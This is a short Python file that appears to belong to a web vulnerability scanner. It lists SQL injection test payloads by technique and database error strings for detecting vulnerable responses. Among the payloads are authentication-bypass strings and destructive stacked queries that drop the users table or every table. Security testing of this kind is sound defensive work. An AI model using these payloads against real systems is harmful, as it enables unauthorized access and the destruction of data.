"""
SQL Injection test payloads
"""

SQL_PAYLOADS = [
    # Basic SQLi
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "\" OR 1=1--",
    
    # Union-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION ALL SELECT NULL--",
    
    # Boolean-based
    "' AND '1'='1",
    "' AND '1'='2",
    "1' AND '1'='1",
    "1' AND '1'='2",
    
    # Time-based
    "' OR SLEEP(5)--",
    "' AND SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    
    # Comment-based
    "'--",
    "\"--",
    "';--",
    
    # Error-based
    "')",
    "'))",
    "'\"",
    
    # Authentication bypass
    "admin' --",
    "admin' #",
    "admin'/*",
    "' or 1=1 limit 1 --",
    "admin' or '1'='1",
    
    # Stacked queries
    "'; DROP TABLE users--",
    "'; EXEC sp_MSForEachTable 'DROP TABLE ?'--",
]

# SQL error signatures to detect
SQL_ERRORS = [
    "sql syntax",
    "mysql_fetch",
    "mysql_num_rows",
    "mysqli",
    "postgresql",
    "sqlite",
    "oracle",
    "odbc",
    "jdbc",
    "mysql error",
    "sql error",
    "database error",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
]